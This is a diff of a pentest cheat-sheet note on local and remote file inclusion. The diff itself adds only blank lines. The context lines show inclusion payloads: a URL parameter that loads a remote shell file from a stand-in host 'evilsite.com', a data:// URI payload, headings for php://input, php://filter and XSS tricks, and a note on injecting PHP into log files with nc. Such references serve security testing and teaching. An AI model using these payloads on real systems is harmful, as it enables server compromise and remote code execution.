@@ -9,12 +9,20 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # local file inclusion / remote file inclusion
 
+
+
 **Command** ([[including remote code]]):
 
 ```bash
 ?file=[http|https|ftp]://evilsite.com/shell.txt
 
 ```
+
+
+
+
+
+
 
 **Command** ([[using php stream php://input]]):
 
@@ -23,7 +31,13 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 ```
 
+
+
+
+
 # specify your payload in the post parameters
+
+
 
 **Command** ([[using php stream php://filter]]):
 
@@ -32,12 +46,24 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 ```
 
+
+
+
+
+
+
 **Command** ([[using data uri]]):
 
 ```bash
 ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
 
 ```
+
+
+
+
+
+
 
 **Command** ([[using xss]]):
 
@@ -46,6 +72,12 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 ```
 
+
+
+
+
 # inject php code in logfile with nc and retrieve it afterwards
 
 search for nc
+
+
